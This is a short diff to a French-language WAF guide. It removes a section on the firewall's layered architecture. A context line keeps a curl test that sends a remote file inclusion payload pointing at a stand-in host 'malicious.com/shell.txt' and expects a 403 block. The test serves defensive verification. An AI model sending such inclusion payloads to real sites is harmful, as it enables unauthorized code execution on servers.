@@ -211,12 +211,6 @@ curl -i "https://TARGET/index.php?page=http://malicious.com/shell.txt"
 ```
 Réponse attendu : ```HTTP/1.1 403 Forbidden```
 
-## Architecture & Fonctionnement du WAF
-
-Le WAF n'est pas une "boite noire". C'est un assemblage de couches (Layers) où chaque composant a un rôle précis dans le filtrage HTTP (Layer 7).
-
-![Architecture WAF](./assets/img/simple-schema-waf.png)
-
 ## Création de Règles Custom (Virtual Patching)
 
 
